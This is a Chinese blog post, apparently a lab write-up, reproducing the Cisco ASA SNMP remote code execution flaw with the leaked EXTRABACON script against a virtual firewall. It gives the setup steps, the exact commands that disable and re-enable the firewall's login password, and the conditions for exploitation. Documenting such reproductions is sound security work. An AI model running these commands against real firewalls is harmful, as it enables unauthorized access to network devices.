---
layout:     post
title:      Cisco SNMP RCE漏洞复现
author:     wooy0ung
tags: 		cisco
category:  	exploit
password:	yes
---


>利用环境:
>攻击机: 192.168.2.63		Mac OSX 10.12.5  
>靶机: 192.168.2.10		Cisco ASA 8.42  
>主机: 192.168.2.142		Windows 10 Pro  
>利用脚本:  
>\eqgrp-free-file\Firewall\EXPLOITS\EXBA\extrabacon_1.1.0.1.py  
<!-- more -->


### 0x00 启动ASA虚拟机

VMware Workstation导入ASA-8.4.2虚拟机，修改虚拟网络编辑器桥接物理网卡，虚拟机网络设置桥接物理网络。

![](/assets/img/exploit/2017-06-15-cisco-snmp-rce/0x00.png)


![](/assets/img/exploit/2017-06-15-cisco-snmp-rce/0x01.png)


串行端口的命名管道修改为\\.\pipe\asa_com

![](/assets/img/exploit/2017-06-15-cisco-snmp-rce/0x02.png)

安装named pipe tcp proxy，按下图配置

![](/assets/img/exploit/2017-06-15-cisco-snmp-rce/0x03.png)

安装SecureCRT，新建Session

![](/assets/img/exploit/2017-06-15-cisco-snmp-rce/0x04.png)

打开ASA虚拟机电源，登入系统(用户名：netemu 密码：netemu)
```
ciscoasa> en
password:******
ciscoasa# show run
```
![](/assets/img/exploit/2017-06-15-cisco-snmp-rce/0x05.png)


### 0x01 配置ASA网络设置

配置网卡、IP

```
ciscoasa# configure terminal
ciscoasa(config)# interface GigabitEthernet0
ciscoasa(config-if)# ip address 192.168.2.10 255.255.255.0	# 配置该网卡IP为192.168.2.10
ciscoasa(config-if)# no shut
ciscoasa(config-if)# nameif inside
```

配置http/https管理方式

```
ciscoasa# configure terminal 
ciscoasa(config)# http server enable 
ciscoasa(config)# http 192.168.2.0 255.255.255.0 inside
```

使用浏览器访问https://192.168.2.10，在弹出页面安装ASDM，登入ASDM(用户名：netemu 密码：netemu)

![](/assets/img/exploit/2017-06-15-cisco-snmp-rce/0x06.png)

![](/assets/img/exploit/2017-06-15-cisco-snmp-rce/0x07.png)

ssh管理配置

```
ciscoasa# configure terminal 
ciscoasa(config)# crypto key generate rsa modulus 1024
INFO: The name for the keys will be: <Default-RSA-Key>
Keypair generation process begin. Please wait...
ciscoasa(config)# write memory
ciscoasa(config)# ssh 192.168.2.10 255.255.255.0 inside
ciscoasa(config)# aaa authentication ssh console LOCAL
```

telnet管理配置
```
ciscoasa# configure terminal 
ciscoasa(config)# telnet 192.168.2.10 255.255.255.0 inside
```

开启snmp-server
```
ciscoasa# configure terminal 
ciscoasa(config)# snmp-server host inside 192.168.2.20 community public
```


### 0x02 测试链路连接

确认主机到ASA链路正常

![](/assets/img/exploit/2017-06-15-cisco-snmp-rce/0x08.png)

确认主机到攻击机正常

![](/assets/img/exploit/2017-06-15-cisco-snmp-rce/0x09.png)

确认攻击机到ASA正常

![](/assets/img/exploit/2017-06-15-cisco-snmp-rce/0x0a.png)

确认ASA到攻击机正常

![](/assets/img/exploit/2017-06-15-cisco-snmp-rce/0x0b.png)

确认能通过ssh管理ASA
![](/assets/img/exploit/2017-06-15-cisco-snmp-rce/0x0c.png)


### 0x03 漏洞复现

ASA信息搜集，得到系统版本号、登陆名
```
python extrabacon_1.1.0.1.py info -t 192.168.2.10 -c public
```

![](/assets/img/exploit/2017-06-15-cisco-snmp-rce/0x0d.png)

ASA版本号是8.42，存在漏洞，下面disable登入密码

```
python extrabacon_1.1.0.1.py exec -k vZwDQA -t 192.168.2.10 -c public --mode pass-disable
```

![](/assets/img/exploit/2017-06-15-cisco-snmp-rce/0x0e.png)

成功登入系统(登陆名：ciscoasa)

```
ssh -p22 -o KexAlgorithms=+diffie-hellman-group1-sha1 ciscoasa@192.168.2.10
```

![](/assets/img/exploit/2017-06-15-cisco-snmp-rce/0x0f.png)

enable登入密码，已登陆状态能够保持，新机器登陆再次需要密码

```
python extrabacon_1.1.0.1.py exec -k vZwDQA -t 192.168.2.10 -c public --mode pass-enable
```

![](/assets/img/exploit/2017-06-15-cisco-snmp-rce/0x10.png)


### 0x04 漏洞利用条件

1.目标防火墙开启22(ssh)或23(telnet)管理方式

2.目标配置了snmp服务。并且snmp配置中的Host Access Entry IP地址和Community字符串能够获得或者已知。

3.目标版本在8.X-8.4.4之间。
